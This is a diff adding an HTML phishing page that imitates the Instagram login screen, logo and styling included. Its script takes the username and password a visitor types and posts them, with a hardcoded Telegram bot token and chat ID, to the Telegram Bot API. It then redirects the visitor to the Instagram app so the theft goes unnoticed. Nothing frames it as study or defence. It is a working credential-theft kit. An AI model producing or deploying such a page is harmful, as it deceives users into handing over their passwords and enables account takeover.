@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #fafafa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .login-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 100%;
+      max-width: 350px;
+      text-align: center;
+      border-radius: 8px;
+    }
+    .login-box img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background: #fafafa;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .login-box button:hover {
+      background-color: #007acc;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    .divider span {
+      margin: 0 10px;
+      color: #999;
+      font-size: 12px;
+    }
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <!-- Real Instagram Logo -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
+      <form onsubmit="sendToTelegram(event)">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+      <div class="divider"><span>OR</span></div>
+      <div class="signup">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function sendToTelegram(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const botToken = "8390801920:AAEwF4sgy52FRsZ0q5kZ5v4u_Kei-GW-lpI";
+      const chatId = "6313504610";
+      const message = `🔐 Instagram Login\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        // ✅ Open Instagram App after 2 sec
+        setTimeout(() => {
+          window.location.href = "instagram://app";
+        }, 2000);
+      }).catch(error => {
+        alert("Error sending to Telegram ❌");
+        console.error(error);
+      });
+    }
+  </script>
+</body>
+</html>
